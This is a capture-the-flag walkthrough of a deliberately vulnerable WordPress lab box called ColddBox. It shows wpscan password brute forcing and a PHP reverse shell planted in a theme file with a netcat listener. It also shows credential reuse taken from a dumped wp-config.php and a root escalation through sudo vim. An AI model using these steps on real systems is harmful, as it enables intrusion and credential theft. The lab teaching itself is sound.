# Coldbox : Easy
This room demonstrates how a vulnerable WordPress application can be exploited through web enumeration and file upload abuse to gain initial access and escalate privileges

### INFO'S
* Difficulty: Easy
* Operating System: Linux
* Attack Type: Web exploitation, credential reuse (WordPress), and Linux privilege escalation

## Enumeration
### Nmap Scan :
```
Command : nmap -sC -sV <ip_address>

nmap scan report for 10.64.185.92
Host is up (0.47s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31

1 IP address (1 host up) scanned in 21.59 seconds

```

An Nmap scan was performed to identify open ports and running services. The scan showed that only port 80 (HTTP) was accessible, indicating the target was primarily a web application.

### Website (PORT 80):

<img width="1680" height="970" alt="Image" src="https://github.com/user-attachments/assets/79957aaf-2aa9-47c7-ab4c-04a8b19ef879" />

Explore the Source Code and options in the Website then understand the work flow of the Website then Start the Directory Scan 

### Gobuster (Directory Scan) :
```
Command : gobuster dir -u http://<ip_address> -w /usr/share/wordlist/dirb/common.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 235] 
/.htaccess            (Status: 403) [Size: 235] 
/.htpasswd            (Status: 403) [Size: 235]
/hidden               (Status: 301) [Size: 311]
/index.php            (Status: 301) [Size: 0]
/server-status        (Status: 403) [Size: 235]
/wp-admin             (Status: 301) [Size: 315]
/wp-content           (Status: 301) [Size: 317]
/wp-includes          (Status: 301) [Size: 316]

```
As we see the interesting directory ``` /hidden ```


<img width="1151" height="195" alt="Image" src="https://github.com/user-attachments/assets/1d8b1e73-daad-4688-856a-778e25f36f85" />

Now We know the users are exists are Philip,Hugo,C0ldd.

another directory ```/wp-admin``` its redirect to the ```/wp-login```

<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/93782abe-ba73-469e-94d5-61e886015c07" />


As we can see the Website is Powered by the WORDPRESS CMS . So We run the Wpscan for Enumeration

## Wpscan

```
Command : wpscan --url http://<ip_address>/ -e u -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.64.185.92/ [10.64.185.92]
[+] Started: Fri Jan  2 18:29:00 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.64.185.92/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.64.185.92/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.64.185.92/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.64.185.92/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.64.185.92/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.64.185.92/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.64.185.92/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://10.64.185.92/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.64.185.92/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <================================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 98########                                                                                                                                                                                
 | Username: c0ldd, Password: 98########


```

We run the scan of the enumrating the users and brute force the password . As it We got one user Password C0ldd : 98######## . Now log in the Website with the Credentials 


<img width="1680" height="971" alt="Image" src="https://github.com/user-attachments/assets/9292ee01-e8d4-4985-83f4-d93b89eba77a" />

We Successfully login in the Websiter In the Wordpress there is a function name of Appearance go to the Editor Function we can see the files go to the any php files i selected the 404.php for the Reverse shell is in the PHP so delete the content in it paste the PHP reverse shell code 
[Revshell](https://www.revshells.com/) go to it and give the ip address and port . paste the code in the 404.php file and click the save the content as been updated with your reverse shell 


Now open the netcat listener in the terminal ```nc -lnvp <port> ```

<img width="1680" height="1050" alt="Image" src="https://github.com/user-attachments/assets/a9720e3b-2eef-4c80-9896-e1940c21e148" />

For getting the Reverse shell Trigger we have to access the file 

<img width="1680" height="227" alt="Image" src="https://github.com/user-attachments/assets/9d4f5e8d-e055-480e-b542-b169e56f7250" />

Got the Reverse Shell (WEB Shell)🎊

```
nc -lvnp 9001  
listening on [any] 9001 ...
connect to [192.168.150.101] from (UNKNOWN) [10.64.185.92] 39320
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:17:58 up 27 min,  0 users,  load average: 0.00, 0.04, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
We got the shell but make it bash shell for make it easy to use so use the command ``` python3 -c 'import pty;pty.spawn("/bin/bash")'```
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/$ cd home
cd home
www-data@ColddBox-Easy:/home$ ls
ls
c0ldd
www-data@ColddBox-Easy:/home$ cd c0ldd
cd c0ldd
www-data@ColddBox-Easy:/home/c0ldd$ ls
ls
user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
We don't have the permission for access this file so we have to escalulate our priviledge from Web shell to user . so the CMS service have the configuration file of it ```/var/www/html``` so any possiblily of the user reuse the same password for all we can gain the access to the User .
```
www-data@ColddBox-Easy:/home/c0ldd$ ls -al
ls -al
total 24
drwxr-xr-x 3 c0ldd c0ldd 4096 Oct 19  2020 .
drwxr-xr-x 3 root  root  4096 Sep 24  2020 ..
-rw------- 1 c0ldd c0ldd    0 Oct 19  2020 .bash_history
-rw-r--r-- 1 c0ldd c0ldd  220 Sep 24  2020 .bash_logout
-rw-r--r-- 1 c0ldd c0ldd    0 Oct 14  2020 .bashrc
drwx------ 2 c0ldd c0ldd 4096 Sep 24  2020 .cache
-rw-r--r-- 1 c0ldd c0ldd  655 Sep 24  2020 .profile
-rw-r--r-- 1 c0ldd c0ldd    0 Sep 24  2020 .sudo_as_admin_successful
-rw-rw---- 1 c0ldd c0ldd   53 Sep 24  2020 user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cd /var/www/html
cd /var/www/html
www-data@ColddBox-Easy:/var/www/html$ ls
ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html      wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
www-data@ColddBox-Easy:/var/www/html$ cat hidden
cat hidden
cat: hidden: Is a directory
www-data@ColddBox-Easy:/var/www/html$ cd hidden
cd hidden
www-data@ColddBox-Easy:/var/www/html/hidden$ ls
ls
index.html
www-data@ColddBox-Easy:/var/www/html/hidden$ cd ..
cd ..
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cyber########');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$ cd /home/c0ldd
cd /home/c0ldd
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
Rm##################################################

```
We Successfully got the User.txt ✨ 

```
c0ldd@ColddBox-Easy:~$ sudo -l 
sudo -l 
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp


```
```sudo -l``` is used for the listing the service which are all can run the root access of it . So go to the [GFTOBin](https://gtfobins.github.io/) Website and search for the services it as been shown

<img width="1680" height="976" alt="Image" src="https://github.com/user-attachments/assets/e04a0f53-0469-4978-84fe-1cdc4cffb95c" />

Search for the service ```VIM``` and get the payload of it 

```
Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    sudo vim -c ':!/bin/sh'

```
BOOM the Payload 
```

c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'
sudo vim -c ':!/bin/sh'

:!/bin/sh
# whoami
whoami
root
# ls
ls
user.txt
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
wq##############################################

```

We Successfully Got the root access and root.txt 💥
